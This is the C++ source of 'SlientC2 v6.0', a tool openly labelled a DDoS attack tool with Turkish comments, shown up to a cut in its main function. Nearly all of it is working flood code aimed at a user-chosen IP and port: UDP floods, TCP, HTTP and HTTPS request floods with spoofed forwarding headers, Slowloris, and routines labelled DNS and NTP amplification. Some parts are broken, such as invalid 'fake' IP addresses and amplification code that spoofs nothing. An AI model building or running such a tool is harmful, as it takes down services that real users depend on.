// SlientC2 v6.0 - C++ Ultimate Edition
// Orijinal Python tool'un yapısı korundu, sadece güçlendirildi
// Compile: g++ -std=c++11 -pthread -O3 -o slientc2 slientc2.cpp -lcurl -lssl -lcrypto
// Run: ./slientc2

#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sstream>
#include <iomanip>

using namespace std;

// ===== RENKLER =====
#define KIRMIZI "\033[91m"
#define YESIL "\033[92m"
#define SARI "\033[93m"
#define MAVI "\033[94m"
#define MOR "\033[95m"
#define CYAN "\033[96m"
#define BEYAZ "\033[97m"
#define SIFIRLA "\033[0m"
#define BOLD "\033[1m"

// ===== GLOBAL DEĞİŞKENLER =====
atomic<long long> paket_sayisi(0);
atomic<long long> bayt_sayisi(0);
atomic<bool> calisiyor(true);
string hedef_ip;
int hedef_port;
int bytes_val = 1000;
int thrs = 1000;
string bost = "y";
time_t baslangic;

// ===== FAKE IP LIST (Orijinal tool'daki gibi) =====
vector<string> fake = {
    "192.165.6.6", "192.176.76.7", "192.156.6.6", "192.155.5.5", 
    "192.143.2.2", "188.1421.41.4", "187.1222.12.1", "192.153.4.4", 
    "192.154.32.4", "192.1535.53.25", "192.154.545.5", "192.143.43.4", 
    "192.165.6.9", "188.1545.54.3"
};

// ===== USER-AGENT LIST (Orijinal tool'daki gibi) =====
vector<string> ua = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
};

// ===== GRADYAN FONKSİYONU =====
void print_smooth_gradient(string text) {
    int line_palette[] = {
        196,202,208,214,220,226,
        190,154,118,82,46,
        47,48,49,50,51,
        45,39,33,27,21,
        57,93,129,165,201
    };
    
    stringstream ss(text);
    string line;
    int idx = 0;
    
    while (getline(ss, line, '\n')) {
        int color_code = line_palette[idx % (sizeof(line_palette)/sizeof(line_palette[0]))];
        cout << "\033[38;5;" << color_code << "m" << line << "\033[0m" << endl;
        idx++;
    }
}

// ===== LOGO =====
string logo = R"(
╔═══╦╗──╔══╦═══╦═╗─╔╦════╗
║╔═╗║║──╚╣╠╣╔══╣║╚╗║║╔╗╔╗║
║╚══╣║───║║║╚══╣╔╗╚╝╠╝║║╚╝
╚══╗║║─╔╗║║║╔══╣║╚╗║║─║║
║╚═╝║╚═╝╠╣╠╣╚══╣║─║║║─║║
╚═══╩═══╩══╩═══╩╝─╚═╝─╚╝

      DdoS Attack Tool
   telegram: t.me/Zeldyy_here
   
)";

// ===== 1. KISIM: UDP AKIŞI (GÜÇLENDİRİLMİŞ) =====
void udp_akisi() {
    while (calisiyor) {
        try {
            int s1 = socket(AF_INET, SOCK_DGRAM, 0);
            if (s1 < 0) continue;
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(hedef_port);
            addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
            
            // UDP payload
            char byte_payload[1490];
            for (int i = 0; i < 1490; i++)
                byte_payload[i] = rand() % 256;
            
            // Batch UDP flood (güçlendirilmiş)
            for (int i = 0; i < bytes_val * 2; i++) {
                if (!calisiyor) break;
                sendto(s1, byte_payload, 1490, 0, (struct sockaddr*)&addr, sizeof(addr));
                paket_sayisi++;
                bayt_sayisi += 1490;
            }
            
            close(s1);
            
            // DNS Amplification (güçlendirilmiş)
            int dns_sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (dns_sock >= 0) {
                struct sockaddr_in dns_addr;
                dns_addr.sin_family = AF_INET;
                dns_addr.sin_port = htons(53);
                inet_pton(AF_INET, "8.8.8.8", &dns_addr.sin_addr);
                
                char dns_packet[512];
                memset(dns_packet, 0, 512);
                
                // DNS header
                dns_packet[0] = rand() % 256; // ID
                dns_packet[1] = rand() % 256;
                dns_packet[2] = 0x01; // Flags
                dns_packet[3] = 0x00;
                dns_packet[4] = 0x00; // Questions
                dns_packet[5] = 0x01;
                
                // DNS query (google.com)
                dns_packet[12] = 6;
                dns_packet[13] = 'g'; dns_packet[14] = 'o'; dns_packet[15] = 'o';
                dns_packet[16] = 'g'; dns_packet[17] = 'l'; dns_packet[18] = 'e';
                dns_packet[19] = 3;
                dns_packet[20] = 'c'; dns_packet[21] = 'o'; dns_packet[22] = 'm';
                dns_packet[23] = 0;
                dns_packet[24] = 0x00; // Type A
                dns_packet[25] = 0x01;
                dns_packet[26] = 0x00; // Class IN
                dns_packet[27] = 0x01;
                
                sendto(dns_sock, dns_packet, 512, 0, (struct sockaddr*)&dns_addr, sizeof(dns_addr));
                close(dns_sock);
                paket_sayisi++;
                bayt_sayisi += 512;
            }
            
        } catch (...) {
            continue;
        }
    }
}

// ===== 2. KISIM: TCP / HTTP AKIŞI (GÜÇLENDİRİLMİŞ) =====
void tcp_http_akisi() {
    while (calisiyor) {
        try {
            for (string fk : fake) {
                if (!calisiyor) break;
                
                int s2 = socket(AF_INET, SOCK_STREAM, 0);
                if (s2 < 0) continue;
                
                struct timeval tv;
                tv.tv_sec = 2;
                tv.tv_usec = 0;
                setsockopt(s2, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
                setsockopt(s2, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
                
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(hedef_port);
                addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
                
                if (connect(s2, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
                    close(s2);
                    continue;
                }
                
                string request = "GET / HTTP/1.1\r\n";
                request += "Host: " + fk + "\r\n";
                request += "User-Agent: " + ua[rand() % ua.size()] + "\r\n";
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n";
                request += "Accept-Language: en-US,en;q=0.5\r\n";
                request += "Accept-Encoding: gzip, deflate, br\r\n";
                request += "Connection: Keep-Alive\r\n";
                request += "Upgrade-Insecure-Requests: 1\r\n";
                request += "Cache-Control: no-cache\r\n";
                request += "Pragma: no-cache\r\n";
                request += "X-Forwarded-For: " + fk + "\r\n";
                request += "X-Real-IP: " + fk + "\r\n";
                request += "\r\n";
                
                send(s2, request.c_str(), request.length(), 0);
                paket_sayisi++;
                bayt_sayisi += request.length();
                
                // Response oku
                char buffer[4096];
                recv(s2, buffer, sizeof(buffer), 0);
                
                close(s2);
            }
        } catch (...) {
            continue;
        }
    }
}

// ===== 3. KISIM: CLOUDSCRAPER HTTP (GÜÇLENDİRİLMİŞ) =====
void cloudscraper_http() {
    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        string url = "http://" + hedef_ip + ":" + to_string(hedef_port) + "/";
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, ua[rand() % ua.size()].c_str());
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "");
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
        headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
        headers = curl_slist_append(headers, "Connection: keep-alive");
        headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
        headers = curl_slist_append(headers, "Cache-Control: no-cache");
        headers = curl_slist_append(headers, "Pragma: no-cache");
        
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, +[](void *ptr, size_t size, size_t nmemb, void *stream) {
            return size * nmemb;
        });
        
        while (calisiyor) {
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                paket_sayisi++;
                bayt_sayisi += 2048;
            }
            this_thread::sleep_for(chrono::milliseconds(1));
        }
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

// ===== 4. KISIM: DÖNGÜSEL UDP VE ALTERNATİF İSTEKLER (GÜÇLENDİRİLMİŞ) =====
void dongusel_udp() {
    while (calisiyor) {
        try {
            for (string fk : fake) {
                if (!calisiyor) break;
                
                int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
                if (udp_sock < 0) continue;
                
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(hedef_port);
                addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
                
                char byte_payload[1490];
                for (int i = 0; i < 1490; i++)
                    byte_payload[i] = rand() % 256;
                
                // Batch UDP + HTTP request
                for (int i = 0; i < bytes_val; i++) {
                    if (!calisiyor) break;
                    
                    // UDP payload
                    sendto(udp_sock, byte_payload, 1490, 0, (struct sockaddr*)&addr, sizeof(addr));
                    paket_sayisi++;
                    bayt_sayisi += 1490;
                    
                    // HTTP request over UDP
                    string req_msg = "GET / HTTP/1.1\r\n";
                    req_msg += "Host: " + fk + "\r\n";
                    req_msg += "User-Agent: " + ua[rand() % ua.size()] + "\r\n";
                    req_msg += "Accept: text/html,*/*\r\n";
                    req_msg += "X-Forwarded-For: " + fk + "\r\n";
                    req_msg += "\r\n";
                    
                    sendto(udp_sock, req_msg.c_str(), req_msg.length(), 0, (struct sockaddr*)&addr, sizeof(addr));
                    paket_sayisi++;
                    bayt_sayisi += req_msg.length();
                }
                
                close(udp_sock);
                
                // NTP Amplification (güçlendirilmiş)
                int ntp_sock = socket(AF_INET, SOCK_DGRAM, 0);
                if (ntp_sock >= 0) {
                    struct sockaddr_in ntp_addr;
                    ntp_addr.sin_family = AF_INET;
                    ntp_addr.sin_port = htons(123);
                    inet_pton(AF_INET, "pool.ntp.org", &ntp_addr.sin_addr);
                    
                    char ntp_packet[48];
                    memset(ntp_packet, 0, 48);
                    ntp_packet[0] = 0x1b;
                    
                    sendto(ntp_sock, ntp_packet, 48, 0, (struct sockaddr*)&ntp_addr, sizeof(ntp_addr));
                    close(ntp_sock);
                    paket_sayisi++;
                    bayt_sayisi += 48;
                }
            }
        } catch (...) {
            continue;
        }
    }
}

// ===== SLOWLORIS (GÜÇLENDİRİLMİŞ) =====
void slowloris_saldiri() {
    while (calisiyor) {
        try {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            struct timeval tv;
            tv.tv_sec = 5;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(hedef_port);
            addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
            
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
                close(sock);
                continue;
            }
            
            string fk = fake[rand() % fake.size()];
            
            string initial = "GET / HTTP/1.1\r\n";
            initial += "Host: " + hedef_ip + "\r\n";
            initial += "User-Agent: " + ua[rand() % ua.size()] + "\r\n";
            initial += "Accept: text/html,*/*\r\n";
            initial += "X-Forwarded-For: " + fk + "\r\n";
            
            send(sock, initial.c_str(), initial.length(), 0);
            
            // Bağlantıyı açık tut (100 header)
            for (int i = 0; i < 100 && calisiyor; i++) {
                string header = "X-a: " + to_string(rand() % 1000000) + "\r\n";
                send(sock, header.c_str(), header.length(), 0);
                paket_sayisi++;
                bayt_sayisi += header.length();
                this_thread::sleep_for(chrono::milliseconds(500));
            }
            
            close(sock);
        } catch (...) {
            continue;
        }
    }
}

// ===== HTTPS FLOOD (GÜÇLENDİRİLMİŞ) =====
void https_saldiri() {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    while (calisiyor) {
        try {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            struct timeval tv;
            tv.tv_sec = 2;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(hedef_port);
            addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
            
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
                close(sock);
                continue;
            }
            
            SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());
            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sock);
            
            if (SSL_connect(ssl) <= 0) {
                SSL_free(ssl);
                SSL_CTX_free(ctx);
                close(sock);
                continue;
            }
            
            string fk = fake[rand() % fake.size()];
            string request = "GET / HTTP/1.1\r\n";
            request += "Host: " + hedef_ip + ":" + to_string(hedef_port) + "\r\n";
            request += "User-Agent: " + ua[rand() % ua.size()] + "\r\n";
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
            request += "Accept-Language: en-US,en;q=0.5\r\n";
            request += "Accept-Encoding: gzip, deflate, br\r\n";
            request += "Connection: keep-alive\r\n";
            request += "Upgrade-Insecure-Requests: 1\r\n";
            request += "Cache-Control: no-cache\r\n";
            request += "Pragma: no-cache\r\n";
            request += "X-Forwarded-For: " + fk + "\r\n";
            request += "X-Real-IP: " + fk + "\r\n";
            request += "\r\n";
            
            SSL_write(ssl, request.c_str(), request.length());
            paket_sayisi++;
            bayt_sayisi += request.length();
            
            char buffer[4096];
            SSL_read(ssl, buffer, sizeof(buffer));
            
            SSL_shutdown(ssl);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            close(sock);
        } catch (...) {
            continue;
        }
    }
}

// ===== İSTATİSTİK =====
void istatistik_goster() {
    while (calisiyor) {
        time_t simdi = time(NULL);
        double gecen = difftime(simdi, baslangic);
        double mb = bayt_sayisi / (1024.0 * 1024.0);
        double mbps = (bayt_sayisi * 8.0) / (gecen * 1000000.0);
        
        system("clear");
        cout << CYAN << R"(
╔══════════════════════════════════════════════════════╗
║              SlientC2 v6.0 C++ ULTIMATE             ║
╠══════════════════════════════════════════════════════╣
║  Target: )" << hedef_ip << ":" << hedef_port << "                   \n";
        cout << "║  Packets: " << paket_sayisi.load() << "                              \n";
        cout << "║  Data: " << fixed << setprecision(2) << mb << " MB (" << mbps << " Mbps)          \n";
        cout << "║  Threads: " << thrs << "                                \n";
        cout << "║  BPS: " << bytes_val << "                                    \n";
        cout << "║  Boost: " << bost << "                                      \n";
        cout << "║  Time: " << (int)gecen << "s                                    \n";
        cout << "╚══════════════════════════════════════════════════════╝" << SIFIRLA << endl;
        
        this_thread::sleep_for(chrono::seconds(1));
    }
}

// ===== ANA FONKSİYON =====
int main() {
    srand(time(NULL));
    system("clear");
    
    // Logo göster
    string padding = "               ";
    stringstream ss;
    stringstream logo_ss(logo);
    string line;
    while (getline(logo_ss, line, '\n')) {
        if (!line.empty())
            ss << padding << line << "\n";
        else
            ss << "\n";
    }
    print_smooth_gradient(ss.str());
    
    try {
        // Prompt (orijinal tool'daki gibi)
        cout << BEYAZ << "┌──[SlientC2] - [SlientC2/root]" << SIFIRLA << endl;
        cout << BEYAZ << "└─➤  " << YESIL << "IP or URL Target ve Port Gir (örnek: 1.1.1.1 80): " << SIFIRLA;
        
        string raw_input;
        string port_str;
        cin >> raw_input >> port_str;
        hedef
